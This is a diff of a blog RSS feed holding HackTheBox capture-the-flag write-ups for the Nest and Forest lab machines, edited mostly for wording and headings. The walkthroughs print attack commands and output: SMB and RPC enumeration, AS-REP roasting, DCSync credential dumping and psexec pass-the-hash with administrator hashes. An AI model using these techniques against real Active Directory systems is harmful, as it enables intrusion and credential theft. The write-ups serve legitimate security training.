       <title>HackTheBox - Cascade</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-cascade/</link>
@@ -878,7 +536,7 @@ $ psexec.py cascade.local/administrator:<span style="color:#e6db74">&#39;baCT3r1
       <guid>https://fahmifj.github.io/writeups/hackthebox/htb-nest/</guid>
       <description>It&amp;#39;s nested</description>
       <content:encoded><![CDATA[<p>Nest is one of my favorite machines after Forest, I learned a lot about enumeration here, especially for SMB.</p>
-<p>Nest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to <code>c.smith</code>. There is also a VB project inside a directory that can not be reached unless you visit its full path. There is a decrypt function on the project that can be used to decrypt <code>c.smith</code>&rsquo;s password. Enumerating <code>c.smith</code> home directory discovers a password for enabling debug mode of a custom application. Debug mode in the application unlocks new options, which can then be used to read the application&rsquo;s configuration and obtain encrypted Administrator password. By reversing the application, I&rsquo;m able to decrypted the administrator password, and then use it gain administrator access.</p>
+<p>Nest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to <code>c.smith</code>. There is a VB project inside a directory that can not be reached unless you visit its full path. This project can be used to decrypt <code>c.smith</code>&rsquo;s password. Enumerating <code>c.smith</code> home directory discovers a password for enabling debug mode of a custom application. With debug mode enabled, I&rsquo;m able to read the application&rsquo;s configuration and obtain encrypted Administrator password. By reversing the application, it allows me to decrypted the administrator password, and then use it gain administrator access.</p>
 <h3 id="skills-learned">Skills Learned</h3>
 <ul>
 <li>SMB enumeration</li>
@@ -890,11 +548,11 @@ $ psexec.py cascade.local/administrator:<span style="color:#e6db74">&#39;baCT3r1
 <li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
 <li>Nmap - Preinstalled in Kali Linux</li>
 <li>smbclient - Preinstalled in Kali Linux</li>
-<li>smbget - Preinstalled in Kali Linux</li>
 <li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
 </ul>
 <h2 id="reconnaissance">Reconnaissance</h2>
 <h3 id="nmap">Nmap</h3>
+<p><code>nmap</code> shows two ports open: SMB on port 445, and an unknown service on port 4386, but the fingerprints show it as &lsquo;Reporting Service V1.2&rsquo;.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nest» «192.168.43.234»
 $ nmap -p1-5000 -sC -sV -oA nmap/nest 10.10.10.178
 Nmap scan report <span style="color:#66d9ef">for</span> htb.nest <span style="color:#f92672">(</span>10.10.10.178<span style="color:#f92672">)</span>
@@ -925,8 +583,7 @@ Host script results:
 | smb2-time:
 |   date: 2020-04-28T15:16:46
 |_  start_date: 2020-04-28T04:20:37
-</code></pre></div><p><code>nmap</code> shows two ports open: SMB on port 445, and an unknown service on port 4386, but the fingerprints show it as &lsquo;Reporting Service V1.2&rsquo;.</p>
-<h2 id="enumeration">Enumeration</h2>
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
 <h3 id="tcp-445---smb">TCP 445 - SMB</h3>
 <p>Anonymous access is allowed here.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nest» «192.168.43.234»
@@ -1309,7 +966,7 @@ Please ensure the optional database import module is installed
 <p><img class="img-container" src="https://cdn-images-1.medium.com/max/1000/1*DWT9GjrNNCYs_YpYY1B8Ug.png" alt="img"  />
 </p>
 <p>The password is: <code>XtH4nkS4Pl4y1nGX</code></p>
-<h4 id="pass-the-hash-with-psexecpy">Pass the Hash with psexec.py</h4>
+<h4 id="psexecpy">psexec.py</h4>
 <p>I can gain access as local system on the box using administrator account and the decrypted password with <code>psexec.py</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «c.smith» «192.168.43.234»
 $ psexec.py HTB-NEST/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
@@ -1590,12 +1247,13 @@ $ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4a
       <guid>https://fahmifj.github.io/writeups/hackthebox/htb-forest/</guid>
       <description>Probably the best Active Direct with easy difficulty</description>
       <content:encoded><![CDATA[<p>When I first joined HackTheBox, Forest was the first machine that I was trying to own. It was an overall easy to medium difficulty machine.</p>
-<p>On Forest, enumeration with anonymous logon/null session on RPC finds Active Directory users account and these can be used to perform <a href="https://attack.mitre.org/techniques/T1558/004/">AS-REP Roasting</a> to obtain a ticket-granting-ticket (TGT) of a service account. The TGT itself contains a password hash of the user that can be cracked offline, this allows me gain a foothold on the system. For the root part, the service account permissions allows me to grant myself a DCsync rights, this can be leveraged to pull Active Directory NTLM hashes and use them to gain access as NT Authority\SYSTEM.</p>
+<p>On Forest, enumeration of RPC service with anonymous logon/null session finds Active Directory users account. With these accounts,  <a href="https://attack.mitre.org/techniques/T1558/004/">AS-REP Roasting</a> attack can be performed to obtain a ticket-granting-ticket (TGT) of a service account. The TGT itself contains a password hash of the user that can be cracked offline, which further allows me gain a foothold in the system. For the root part, the service account permissions allows me to grant myself a DCsync rights, this can be leveraged to pull Active Directory NTLM hashes and use them to gain access as NT Authority\SYSTEM.</p>
 <h3 id="skills-learned">Skills Learned</h3>
 <ul>
 <li>AS-REP roasting</li>
-<li>Creating Network Drive</li>
-<li>Abusing DCSync Rights</li>
+<li>AD recon using BloodHound</li>
+<li>Creating network drive</li>
+<li>Abusing DCSync rights</li>
 </ul>
 <h3 id="tools">Tools</h3>
 <ul>
@@ -1616,7 +1274,7 @@ $ nmap -sV -sC -oA nmap/initial-forest 10.10.10.171 -v
 <li><code>-oA</code>, to save the output to all format (xml, nmap, gnmap)</li>
 <li><code>-v</code>, verbose mode.</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;snip&gt;...
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
 PORT     STATE SERVICE      VERSION
 53/tcp   open  domain?
 | fingerprint-strings:
@@ -1660,9 +1318,9 @@ Host script results:
 | smb2-time:
 |   date: 2020-03-21T08:21:14
 |_  start_date: 2020-03-20T05:27:17
-...&lt;snip&gt;...
+...&lt;SNIP&gt;...
 </code></pre></div><p>From the scan results, I&rsquo;m dealing with a domain controller of an Active Directory system.</p>
-<p>When it comes to an Active Directory, I often to see people begin their enumeration from SMB (445) and sometimes LDAP (389). I&rsquo;ll also follow that sequence because these three ports most likely to have anonymous login.</p>
+<p>When it comes to an Active Directory, I often to see people begin their enumeration from SMB (445) and sometimes LDAP (389). I&rsquo;ll also follow that sequence because these three ports are most likely to allow anonymous login.</p>
 <h2 id="enumeration">Enumeration</h2>
 <h3 id="tcp-139445---smb">TCP 139,445 - SMB</h3>
 <p>I can authenticate myself as anonymous/null session using both <code>smbclient</code> and <code>rppclient</code>. With current access I could get list of users and groups but not to file shares.</p>
@@ -1674,7 +1332,7 @@ user:<span style="color:#f92672">[</span>Administrator<span style="color:#f92672
 user:<span style="color:#f92672">[</span>Guest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
 user:<span style="color:#f92672">[</span>krbtgt<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f6<span style="color:#f92672">]</span>
 user:<span style="color:#f92672">[</span>DefaultAccount<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f7<span style="color:#f92672">]</span>
-...&lt;snip&gt;...
+...&lt;SNIP&gt;...
 user:<span style="color:#f92672">[</span>sebastien<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x479<span style="color:#f92672">]</span>
 user:<span style="color:#f92672">[</span>lucinda<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47a<span style="color:#f92672">]</span>
 user:<span style="color:#f92672">[</span>svc-alfresco<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47b<span style="color:#f92672">]</span>
@@ -1714,7 +1372,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:cf77e95a8a50a6d7b298c46e851e93a7$ea7045cfe9
 </code></pre></div><p><img class="img-container" src="imgs/54b3a7dbe1c644a98c00a8458e2723ff.png" alt="3fa7dc6810434503007549f8610016fa.png"  />
 </p>
 <p>The password is <code>s3rvice</code>.</p>
-<h4 id="remote-login---evil-winrm">Remote login - Evil-WinRM</h4>
+<h4 id="winrm---svc-alfresco">WinRM - svc-alfresco</h4>
 <p>User <code>svc-alfresco</code> can login remotely via WinRM using <code>evil-winrm</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.116»
 $ evil-winrm -i <span style="color:#e6db74">&#39;10.10.10.161&#39;</span> -u svc-alfresco -p s3rvice
@@ -1764,7 +1422,7 @@ $ bloodhound --no-sandbox &amp;
 <li>Leverage <code>Account Operators</code> indirect membership to create a new user and join it to <code>Exchange Windows Permission</code> group</li>
 <li>Leverage <code>Exchange Windows Permissions</code> group permission to grant <code>DS-Replication-Get-Changes-All</code> (DCSync) to the new user.</li>
 </ul>
-<h4 id="credential-dumping-dcsync-rights">Credential Dumping DCSync rights</h4>
+<h4 id="credential-dumping-with-dcsync-rights">Credential Dumping with DCSync Rights</h4>
 <p>In Forest, I&rsquo;ll have to load <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView.ps1</a> first.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS mikun<span style="color:#960050;background-color:#1e0010">:</span>\&gt; Import-Module .\powerview.ps1
 </code></pre></div><p>Then I&rsquo;ll create a new user and join it to the <code>Exchange Windows Permissions</code> group.</p>
@@ -1797,7 +1455,7 @@ htb.local<span style="color:#ae81ff">\m</span>ark:1151:aad3b435b51404eeaad3b435b
 htb.local<span style="color:#ae81ff">\s</span>anti:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
 ... &lt;SNIP&gt; ...
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
-</code></pre></div><h4 id="pass-the-hash-with-psexecpy">Pass the Hash with psexec.py</h4>
+</code></pre></div><h4 id="psexecpy">psexec.py</h4>
 <p>Administrator hash can be used with <code>psexec.py</code> from Impacket to gain shell access (pass-the-hash).</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
 $ psexec.py -hashes <span style="color:#e6db74">&#39;aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6&#39;</span> administrator@10.10.10.161
